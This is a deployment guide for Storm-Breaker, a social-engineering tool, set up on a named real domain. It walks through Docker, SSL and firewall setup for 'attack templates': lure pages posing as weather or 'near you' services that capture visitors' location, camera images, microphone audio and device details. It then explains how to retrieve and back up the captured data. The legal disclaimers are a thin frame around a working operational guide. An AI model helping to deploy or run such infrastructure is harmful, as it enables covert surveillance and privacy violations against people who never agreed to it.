# Storm-Breaker Docker Deployment Guide

## ⚠️ LEGAL WARNING

**This tool is designed for social engineering and unauthorized data collection.**

**ONLY USE THIS TOOL IF YOU HAVE:**
- Written authorization for penetration testing
- Legal compliance with all applicable laws (GDPR, CCPA, wiretapping laws, etc.)
- Explicit consent from all parties being monitored
- A legitimate security research or educational purpose in a controlled environment

**Unauthorized use may result in criminal prosecution.**

---

## Prerequisites

1. **Server Requirements:**
   - Ubuntu 20.04+ or similar Linux distribution
   - Minimum 1GB RAM, 1 CPU core
   - 10GB disk space
   - Root or sudo access

2. **Domain Setup:**
   - Domain name: `uzyol.uz`
   - DNS A record pointing to your server IP
   - Port 80 and 443 open in firewall

3. **Software Requirements:**
   - Docker Engine 20.10+
   - Docker Compose 2.0+

---

## Installation Steps

### Step 1: Install Docker and Docker Compose

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

# Add current user to docker group
sudo usermod -aG docker $USER

# Install Docker Compose
sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose

# Verify installation
docker --version
docker-compose --version

# Log out and back in for group changes to take effect
```

### Step 2: Clone and Configure

```bash
# Navigate to your project directory
cd /home/hikmatillo/opt/Storm-Breaker

# Create environment file
cp .env.example .env

# Edit environment variables
nano .env
# Update DOMAIN, ADMIN_PASSWORD, SSL_EMAIL

# Update admin credentials in config.php
nano storm-web/config.php
# Change the password to match your .env file
```

### Step 3: Configure Firewall

```bash
# Allow HTTP and HTTPS traffic
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable
sudo ufw status
```

### Step 4: Obtain SSL Certificate (Let's Encrypt)

**Option A: Using Certbot (Recommended)**

```bash
# Install Certbot
sudo apt install certbot -y

# Stop any running web servers
sudo systemctl stop nginx apache2 2>/dev/null || true

# Obtain certificate (standalone mode)
sudo certbot certonly --standalone \
  --preferred-challenges http \
  --email admin@uzyol.uz \
  --agree-tos \
  --no-eff-email \
  -d uzyol.uz \
  -d www.uzyol.uz

# Copy certificates to nginx directory
sudo cp /etc/letsencrypt/live/uzyol.uz/fullchain.pem nginx/ssl/
sudo cp /etc/letsencrypt/live/uzyol.uz/privkey.pem nginx/ssl/

# Set proper permissions
sudo chmod 644 nginx/ssl/fullchain.pem
sudo chmod 600 nginx/ssl/privkey.pem
sudo chown $USER:$USER nginx/ssl/*.pem
```

**Option B: Using Docker Certbot**

```bash
# Create docker-compose-certbot.yml for initial certificate
docker run -it --rm \
  -v $(pwd)/nginx/ssl:/etc/letsencrypt \
  -v $(pwd)/certbot:/var/www/certbot \
  -p 80:80 \
  certbot/certbot certonly \
  --standalone \
  --email admin@uzyol.uz \
  --agree-tos \
  --no-eff-email \
  -d uzyol.uz \
  -d www.uzyol.uz
```

**Option C: Self-Signed Certificate (Testing Only)**

```bash
# Generate self-signed certificate (NOT for production)
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout nginx/ssl/privkey.pem \
  -out nginx/ssl/fullchain.pem \
  -subj "/C=UZ/ST=Tashkent/L=Tashkent/O=Test/CN=uzyol.uz"
```

### Step 5: Build and Deploy

```bash
# Build the Docker image
docker-compose build

# Start the services
docker-compose up -d

# Check if containers are running
docker-compose ps

# View logs
docker-compose logs -f
```

### Step 6: Verify Deployment

```bash
# Check if services are running
curl -I http://localhost:2525
curl -I https://uzyol.uz

# Access the admin panel
# URL: https://uzyol.uz
# Username: admin
# Password: (from config.php)
```

---

## Service Management

### Start Services
```bash
docker-compose up -d
```

### Stop Services
```bash
docker-compose down
```

### Restart Services
```bash
docker-compose restart
```

### View Logs
```bash
# All services
docker-compose logs -f

# Specific service
docker-compose logs -f storm-breaker
docker-compose logs -f nginx
```

### Update Application
```bash
# Pull latest changes
git pull

# Rebuild and restart
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

---

## SSL Certificate Renewal

### Automatic Renewal (Recommended)

Add to crontab:
```bash
# Edit crontab
crontab -e

# Add this line (renew at 2 AM every day)
0 2 * * * docker-compose down && certbot renew --quiet && cp /etc/letsencrypt/live/uzyol.uz/*.pem $(pwd)/nginx/ssl/ && docker-compose up -d
```

### Manual Renewal
```bash
# Stop services
docker-compose down

# Renew certificate
sudo certbot renew

# Copy new certificates
sudo cp /etc/letsencrypt/live/uzyol.uz/fullchain.pem nginx/ssl/
sudo cp /etc/letsencrypt/live/uzyol.uz/privkey.pem nginx/ssl/

# Restart services
docker-compose up -d
```

---

## Accessing Collected Data

### View Captured Images
```bash
ls -lah storm-web/images/
```

### View Recorded Audio
```bash
ls -lah storm-web/sounds/
```

### View Logs
```bash
# PHP logs
ls -lah storm-web/log/

# View specific log
tail -f storm-web/log/php-*.log
```

### Download Data from Server
```bash
# From your local machine
scp -r user@your-server-ip:/path/to/Storm-Breaker/storm-web/images ./
scp -r user@your-server-ip:/path/to/Storm-Breaker/storm-web/sounds ./
```

---

## Template URLs

After deployment, your attack templates will be available at:

1. **Normal Data Collection (Device Info)**
   - `https://uzyol.uz/templates/normal_data/index.html`

2. **Location Tracking**
   - `https://uzyol.uz/templates/nearyou/index.html`
   - `https://uzyol.uz/templates/weather/index.html`

3. **Camera Access**
   - `https://uzyol.uz/templates/camera_temp/index.html`

4. **Microphone Access**
   - `https://uzyol.uz/templates/microphone/index.html`

5. **Admin Panel**
   - `https://uzyol.uz/`
   - Login: admin / (your password)

---

## Security Hardening

### 1. Change Default Credentials
```bash
# Edit config.php
nano storm-web/config.php

# Change admin password to a strong password
# Use: openssl rand -base64 32
```

### 2. Restrict Admin Panel Access

Edit `nginx/nginx.conf` and add IP whitelist:
```nginx
location / {
    # Only allow specific IPs to access admin panel
    allow YOUR_IP_ADDRESS;
    deny all;

    proxy_pass http://storm-breaker:2525;
    # ... rest of config
}
```

### 3. Enable Firewall Logging
```bash
sudo ufw logging on
```

### 4. Regular Updates
```bash
# Update Docker images monthly
docker-compose pull
docker-compose up -d
```

---

## Troubleshooting

### Issue: Containers won't start
```bash
# Check logs
docker-compose logs

# Rebuild from scratch
docker-compose down -v
docker-compose build --no-cache
docker-compose up -d
```

### Issue: SSL certificate errors
```bash
# Verify certificate files exist
ls -la nginx/ssl/

# Check certificate validity
openssl x509 -in nginx/ssl/fullchain.pem -text -noout

# Regenerate if needed (see Step 4)
```

### Issue: PHP server not responding
```bash
# Check if PHP is running inside container
docker-compose exec storm-breaker ps aux | grep php

# Restart container
docker-compose restart storm-breaker
```

### Issue: Permission denied on volumes
```bash
# Fix permissions
sudo chown -R $USER:$USER storm-web/log storm-web/images storm-web/sounds
chmod -R 755 storm-web/log storm-web/images storm-web/sounds
```

### Issue: 502 Bad Gateway
```bash
# Check if backend is running
docker-compose exec nginx curl http://storm-breaker:2525

# Verify network connectivity
docker network inspect storm-breaker_storm-network
```

---

## Monitoring

### View Real-time Access
```bash
# Watch Nginx access logs
docker-compose exec nginx tail -f /var/log/nginx/access.log

# Watch application logs
docker-compose logs -f storm-breaker
```

### Check Resource Usage
```bash
docker stats
```

---

## Backup

### Create Backup
```bash
# Backup collected data
tar -czf backup-$(date +%Y%m%d).tar.gz \
  storm-web/images \
  storm-web/sounds \
  storm-web/log \
  storm-web/Settings.json \
  storm-web/check-c.json
```

### Restore Backup
```bash
# Extract backup
tar -xzf backup-YYYYMMDD.tar.gz

# Restart services
docker-compose restart
```

---

## Complete Removal

```bash
# Stop and remove containers
docker-compose down -v

# Remove images
docker rmi $(docker images -q storm-breaker*)

# Remove data (WARNING: Irreversible)
rm -rf storm-web/images/*
rm -rf storm-web/sounds/*
rm -rf storm-web/log/*
```

---

## Additional Notes

1. **HTTPS is Required**: Modern browsers require HTTPS for accessing camera, microphone, and geolocation APIs
2. **Cookie Consent**: Consider legal requirements for cookie banners in your jurisdiction
3. **Data Retention**: Implement data retention policies and secure deletion
4. **Logging**: All access is logged in Nginx logs for audit purposes
5. **Rate Limiting**: Consider adding rate limiting to prevent abuse

---

## Support

For issues with:
- **Storm-Breaker Application**: Check original repository
- **Docker Deployment**: Review Docker logs and documentation
- **SSL/HTTPS**: Consult Let's Encrypt documentation
- **Nginx**: Check Nginx error logs

---

## Legal Compliance Checklist

Before deploying, ensure you have:

- [ ] Written authorization for security testing
- [ ] Documented scope of testing
- [ ] Informed consent from all participants
- [ ] Compliance with local privacy laws
- [ ] Data protection impact assessment (if required)
- [ ] Incident response plan
- [ ] Data retention and deletion policy
- [ ] Access control and audit logging
- [ ] Secure communication channels for reporting
- [ ] Legal review of deployment

**Remember: Unauthorized use of surveillance tools is illegal in most jurisdictions.**
